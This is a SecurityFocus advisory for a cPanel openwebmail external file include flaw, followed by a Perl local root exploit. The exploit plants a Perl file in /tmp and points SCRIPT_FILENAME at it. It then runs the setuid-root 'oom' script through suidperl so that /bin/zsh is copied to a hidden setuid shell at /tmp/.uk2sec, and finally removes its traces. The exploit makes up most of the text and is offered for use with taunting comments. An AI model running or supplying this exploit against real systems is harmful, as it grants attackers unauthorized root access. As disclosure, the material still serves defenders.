source: http://www.securityfocus.com/bid/6885/info

It has been reported that cPanels' openwebmail package, distributed as part of the cPanel CGI application, is vulnerable to an external file include vulnerability. Exploitation of this issue may result in local user privilage escalation.

By manipulating environment variables a local attacker may supply, as an include file, an arbitrary local perl-script. This may make it possible to execute the included script with the rights of the openwebmail 'oom' script, which is by default setuid root.

This vulnerability has been reported to affect cPanel version 5 however, previous versions may also be affected. 

#!/usr/bin/perl
#UK2_SEC Presents...
#Cpanel Local exploit ;) leaves /bin/zsh rootshell in /tmp
#Written by:
#deadbeat
#For and behalf of UK2_SEC 
#http://oakey.no-ip.com:82/uk2sec/
#
#Nice and short exploit ;) yippe don't you love perl..
#mail us:
#eip@oakey.no-ip.com (deadbeat)
#deadbeat@hush.com (deadbeat)
#c0w_d0g3@yahoo.co.uk (c0w_d0g3)
print "UK2SEC presents...\n";
print "Cpanel local epxloit..\n";
print "coded by:deadbeat, for UK2SEC...\n";
open (FILEHANDLE, ">/tmp/openwebmail-shared.pl") or die ("Can't open 
/tmp/openwebmail-shared.pl");
print FILEHANDLE "\#\!/usr/bin/perl\n";
print FILEHANDLE "\$cmd = \"cp /bin/zsh /tmp/.uk2sec\;chmod +s 
/tmp/.uk2sec\"\;";   
close (FILEHANDLE);
local($ENV{'SCRIPT_FILENAME'} = "/tmp/openwebmail-shared.pl");
system("suidperl -T /usr/local/cpanel/base/openwebmail/oom");
print "Done..rootshell should be in: /tmp/.uk2sec\n";
sleep 2;
print "Clean up..\n";
`rm -rf /tmp/openwebmail-shared.pl`;
print "Done...have fun kiddiot...\n";